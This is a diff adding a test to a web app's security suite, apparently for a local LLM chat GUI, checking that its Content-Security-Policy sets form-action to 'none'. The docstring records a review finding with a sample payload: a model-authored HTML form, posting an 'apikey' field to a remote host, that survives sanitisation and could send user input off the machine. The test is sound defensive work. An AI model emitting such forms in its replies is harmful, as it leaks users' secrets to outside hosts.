@@ -338,3 +338,37 @@ def test_media_and_fetch_of_blob_urls_are_permitted():
     assert "*" not in connect_src.replace("https://*.hf.co", ""), (
         f"connect-src must not carry a wildcard origin: {connect_src!r}"
     )
+
+
+def test_form_action_is_locked_down_because_it_has_no_default_src_fallback():
+    """A model-authored <form> survives sanitisation; form-action is what stops it.
+
+    R41 review, 2026-08-18. DOMPurify's default ALLOWED_TAGS includes `form`, so
+    a reply rendering
+        <form action="https://elsewhere/" method="post"><input name="apikey">
+    reaches the DOM intact - measured in a real browser, where the action
+    resolved to that remote origin and submitting raised NO CSP violation. No
+    script is involved, so neither DOMPurify nor the script-src nonce sits in
+    that path, and for an offline-first product that was a way for a rendered
+    reply to post what the user typed into it off the machine.
+
+    The reason it was missing is the interesting half and is why this test
+    asserts PRESENCE rather than a value: form-action is a NAVIGATION directive
+    with no default-src fallback, so `default-src 'self'` looks like it covers
+    submissions and does not. Omitting it allows submission anywhere.
+    """
+    with TestClient(create_app(_engine())) as c:
+        r = c.get("/health")
+    csp = r.headers.get("Content-Security-Policy", "")
+    form_action = _directive(csp, "form-action")
+    assert form_action, (
+        "no form-action directive. default-src does NOT cover it (it is a "
+        "navigation directive with no fallback), so form submission is "
+        f"unrestricted and a sanitiser-surviving <form> can post off-box. csp={csp!r}"
+    )
+    assert form_action == "'none'", (
+        "form-action must stay 'none': nothing in the GUI submits a form (there "
+        "is no <form> element in static/ at all), so 'none' costs nothing and "
+        "also closes the same-origin CSRF shape against localm's own /api. "
+        f"form-action={form_action!r}"
+    )
